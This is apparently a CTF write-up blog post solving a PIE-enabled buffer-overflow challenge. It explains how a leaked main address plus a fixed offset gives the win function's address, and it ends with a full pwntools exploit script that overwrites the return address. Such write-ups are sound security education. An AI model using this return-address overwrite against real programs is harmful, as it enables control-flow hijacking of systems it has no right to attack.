---
type: Blog
title: AIRANGE'24 - Pwn - Actual Overflow 3
date: '2024-04-17'
tags: ['ctf', 'pwn', 'airange', 'writeup', 'pwntools', 'overflow']
draft: false
summary: Return to win function through one given address and pie enabled
---

## Challenge Description

I gave you the function back, but some mitigations were enabled, can you bypass those?

[Download](https://airange.online/files/36f153c67108a494716a3145ad6ac150/actual_overflow_3.tar?token=eyJ1c2VyX2lkIjo0NSwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MzR9.Zh_uAQ.1XvwELSsvb_RWacfHV5k6Fmsn8c)

## Solution

![Screenshot](/static/writeups/overflow3/3.png)

In this challenge the pie and nx is enabled which means that every time a binary is executed it will generate the random address of every instruction in binary. BUT are those really random???

NO they are not, there is a a thing called as offset(the distance between any two function or distance of base of binary to that function) so it never changes.
WHY??????????
Because the distance of one symbol to another symbol will never change, because lets say you have one guy named ali standing 1 meter away from origin and a guy named haris standing at 2 meter from origin so regardless of their address they will always be there, that's how execution work.

Well it's just the base address that is random anything except that is an addition of offset in that address.

***base address + offset = function address***

 so if we know one address we can calculate it’s offset to another function and every time a binary is executed we just add that offset in that SO randomly generated offset.

***win address = address (+ or -) offset*** 

Here’s how i calculated offset between main and win function system call.

![Screenshot](/static/writeups/overflow3/4.png)

$$
0x5555555552bb - 0x0000555555555253 = 0x68
$$

$$
0x68 =104
$$

**EXPLOIT:**

```python
from pwn import *

# Define remote host and port
remote_host = '143.198.227.172'  # Replace with the actual remote host IP address
remote_port = 32778        # Replace with the actual remote port number

# Establish connection to remote server
p = remote(remote_host, remote_port)

# Receive main address
p.recvuntil(b'main @ ')
main_addr = p.recvuntil(b'\n', drop=True).decode()
log.info(f"Main function address: {main_addr}")

# Calculate the win function offset (replace it with the actual offset)
offset = 104  # replace it with the actual offset between main and win function

# Calculate win function address
win_addr = int(main_addr, 16) - offset
win_addr = p64(win_addr)

# Craft payload
payload = (b'A' * 264)  # Offset to return address
payload += win_addr     # Overwrite return address with the address of the win() function

# Send payload
p.sendline(payload)
p.recvline()
# Receive and print output
print(p.recvall())

# Close connection
p.close()
```

![Screenshot](/static/writeups/overflow3/5.png)